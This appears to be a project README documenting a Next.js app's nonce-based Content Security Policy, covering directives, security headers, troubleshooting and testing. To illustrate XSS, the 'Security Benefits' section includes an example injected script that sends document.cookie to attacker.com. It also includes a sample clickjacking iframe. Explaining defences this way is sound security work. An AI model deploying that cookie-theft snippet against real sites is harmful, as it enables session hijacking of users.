# Content Security Policy (CSP) Implementation

## Overview

The frontend now implements **strict nonce-based Content Security Policy** to protect against XSS attacks and other code injection vulnerabilities. This is a production-grade security implementation that:

- ✅ Uses cryptographic nonces for script execution
- ✅ Blocks unauthorized inline scripts
- ✅ Prevents clickjacking with frame-ancestors
- ✅ Enforces HTTPS in production
- ✅ Restricts resource loading to trusted sources

---

## How It Works

### 1. **Nonce Generation** (`src/middleware.ts`)

Every request gets a unique cryptographic nonce:

```typescript
function generateNonce(): string {
  const array = new Uint8Array(16);
  crypto.getRandomValues(array);
  return Buffer.from(array).toString('base64');
}
```

**Example nonce:** `rB0zt8tkiKU7mzr8iiA+0Q==`

### 2. **CSP Header**

The middleware sets the CSP header on every response:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-rB0zt8tkiKU7mzr8iiA+0Q==' 'strict-dynamic'; ...
```

### 3. **Script Execution**

Only scripts with the correct nonce can execute:

```html
<!-- ✅ Allowed: Script with nonce -->
<script nonce="rB0zt8tkiKU7mzr8iiA+0Q==">
  console.log('This runs!');
</script>

<!-- ❌ Blocked: Script without nonce -->
<script>
  console.log('This is blocked!');
</script>
```

**Next.js automatically handles nonces** for its internal scripts, so hydration and routing work seamlessly.

---

## CSP Directives Explained

### Development Mode

```
default-src 'self'
  → Only load resources from same origin

script-src 'self' 'nonce-xxx' 'strict-dynamic'
  → Scripts: same origin + nonce required + dynamic imports allowed

style-src 'self' 'unsafe-inline'
  → Styles: same origin + inline allowed (Tailwind + Next.js)

img-src 'self' data: https://contractconquest.s3.amazonaws.com https://*.s3.amazonaws.com
  → Images: same origin + data URIs + S3 buckets

connect-src 'self' http://localhost:8000 ws://localhost:*
  → API calls: same origin + backend API + WebSocket (hot reload)

frame-ancestors 'none'
  → Cannot be embedded in iframes (prevents clickjacking)
```

### Production Mode

Same as development, **plus**:

```
upgrade-insecure-requests
  → Automatically upgrade http:// to https://
```

---

## Security Benefits

### ✅ **XSS Protection**

**Without CSP:**
```html
<!-- Attacker injects malicious script -->
<div id="user-content">
  <script>
    // Steal cookies and send to attacker.com
    fetch('https://attacker.com/steal?data=' + document.cookie);
  </script>
</div>
```
This script would execute! 😱

**With CSP:**
```
🚫 Refused to execute inline script because it violates CSP directive:
   "script-src 'self' 'nonce-xxx'"
```
The attack is **blocked**! ✅

### ✅ **Clickjacking Protection**

**Without CSP:**
```html
<!-- Attacker embeds your site in an iframe -->
<iframe src="https://yoursite.com/dashboard"></iframe>
<!-- Tricks users into clicking on hidden elements -->
```

**With CSP:**
```
frame-ancestors 'none'
```
Your site **cannot be embedded** in iframes! ✅

### ✅ **HTTPS Enforcement**

In production, all HTTP requests are automatically upgraded to HTTPS:

```
http://yoursite.com → https://yoursite.com (automatic)
```

---

## Implementation Details

### Files Modified

1. **`src/middleware.ts`**
   - Generates nonce per request
   - Builds CSP header dynamically
   - Adds security headers to all responses
   - Handles dev vs production differences

2. **`src/lib/csp.ts`**
   - Utility function to get nonce in Server Components
   - Used for custom inline scripts (if needed)

### Middleware Flow

```
Request → Middleware
           ├── Generate nonce
           ├── Check authentication (existing logic)
           ├── Build CSP with nonce
           ├── Add security headers
           └── Return response with headers
```

### Security Headers Added

| Header | Value | Purpose |
|--------|-------|---------|
| `Content-Security-Policy` | Nonce-based CSP | XSS protection |
| `X-Frame-Options` | `DENY` | Clickjacking protection |
| `X-Content-Type-Options` | `nosniff` | MIME-sniffing protection |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Privacy protection |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=()` | Feature access control |
| `x-nonce` | Generated nonce | Pass nonce to components |

---

## Using Nonces in Custom Scripts

If you need to add custom inline scripts (rare), use the nonce:

### Server Component Example

```typescript
import { getNonce } from '@/lib/csp';

export default async function MyComponent() {
  const nonce = await getNonce();

  return (
    <div>
      <script nonce={nonce}>
        {`
          // Your inline script
          console.log('Allowed with nonce!');
        `}
      </script>
    </div>
  );
}
```

### ⚠️ **Best Practice**

Avoid inline scripts when possible. Use:
- External script files (loaded from `'self'`)
- React event handlers (no CSP issues)
- Next.js Script component for third-party scripts

---

## Troubleshooting

### Issue: Scripts Blocked in Browser Console

**Error:**
```
Refused to execute inline script because it violates the following
Content Security Policy directive: "script-src 'self' 'nonce-xxx'"
```

**Solution:**
1. Check if the script has the correct nonce attribute
2. For Next.js scripts, they should auto-get nonces (if not, Next.js version issue)
3. For custom scripts, use `getNonce()` and add to script tag

### Issue: API Calls Blocked

**Error:**
```
Refused to connect to 'https://api.example.com' because it violates
the following Content Security Policy directive: "connect-src 'self'"
```

**Solution:**
Add the API domain to `connect-src` in `middleware.ts`:

```typescript
`connect-src 'self' ${apiDomain} https://api.example.com`,
```

### Issue: Images Not Loading from New Source

**Error:**
```
Refused to load the image because it violates the following Content
Security Policy directive: "img-src 'self' data: https://..."
```

**Solution:**
Add the image source to `img-src` in `middleware.ts`:

```typescript
"img-src 'self' data: https://contractconquest.s3.amazonaws.com https://new-cdn.com",
```

### Issue: Styles Broken

**Symptoms:** Page looks unstyled or partially styled

**Cause:** Inline styles blocked (unlikely with current config)

**Solution:**
Verify `style-src 'self' 'unsafe-inline'` is in the CSP header:

```bash
# Check CSP header in browser DevTools
Network → Select any request → Headers → Response Headers → Content-Security-Policy
```

---

## Testing CSP

### 1. **Check Headers in Browser**

1. Open DevTools (F12)
2. Go to **Network** tab
3. Reload page
4. Click on the main document request
5. Check **Response Headers**
6. Look for `Content-Security-Policy`

**Expected:**
```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-...' 'strict-dynamic'; ...
```

### 2. **Test Script Blocking**

Try adding an inline script without nonce:

```html
<script>alert('test')</script>
```

**Expected:** Browser console shows CSP violation and script doesn't run.

### 3. **Verify Nonce Rotation**

1. Load page → Check nonce in CSP header
2. Reload page → Check nonce again
3. **Nonces should be different** (proves uniqueness per request)

---

## Production Deployment

### Environment Variables

Make sure these are set in production:

```bash
NODE_ENV=production
NEXT_PUBLIC_API_URL=https://api.contractconquest.com
```

### Expected Production CSP

```
default-src 'self';
script-src 'self' 'nonce-xxx' 'strict-dynamic';
style-src 'self' 'unsafe-inline';
img-src 'self' data: https://contractconquest.s3.amazonaws.com https://*.s3.amazonaws.com https://*.s3.*.amazonaws.com;
font-src 'self' data:;
connect-src 'self' https://api.contractconquest.com;
frame-ancestors 'none';
base-uri 'self';
form-action 'self';
upgrade-insecure-requests;
```

### Monitoring CSP Violations

You can add CSP reporting to monitor violations in production:

```typescript
// In middleware.ts buildCSP function
cspDirectives.push("report-uri https://yoursite.com/csp-report");
```

Then create an endpoint to log violations:

```typescript
// app/api/csp-report/route.ts
export async function POST(request: Request) {
  const violation = await request.json();
  console.error('CSP Violation:', violation);
  return new Response('OK', { status: 200 });
}
```

---

## Compatibility

### ✅ **Supported**
- Next.js 13+ (App Router)
- React 18+
- Modern browsers (Chrome, Firefox, Safari, Edge)
- Tailwind CSS
- External scripts with proper configuration

### ⚠️ **Limitations**
- `eval()` is blocked (rare, usually not needed)
- Inline event handlers need nonces (use React handlers instead)
- Third-party widgets may need CSP exceptions

---

## Further Hardening (Optional)

### 1. **Remove 'unsafe-inline' from Styles**

Currently needed for Next.js + Tailwind, but can be removed if:
- Using CSS Modules exclusively
- Migrating to styled-components with nonce support

### 2. **Add Report-Only Mode**

Test stricter CSP without breaking site:

```typescript
response.headers.set('Content-Security-Policy-Report-Only', stricterCSP);
```

### 3. **Add Subresource Integrity (SRI)**

For external scripts:

```html
<script
  src="https://cdn.example.com/script.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/ux..."
  crossorigin="anonymous"
></script>
```

---

## Summary

✅ **CSP is now active** and protecting your app from:
- Cross-Site Scripting (XSS)
- Clickjacking
- Code injection
- Unauthorized resource loading

✅ **No breaking changes** - Next.js scripts work automatically

✅ **Production-ready** - Environment-aware configuration

⚠️ **Monitor CSP violations** in browser console during testing

If you encounter any CSP-related issues, check the **Troubleshooting** section above!
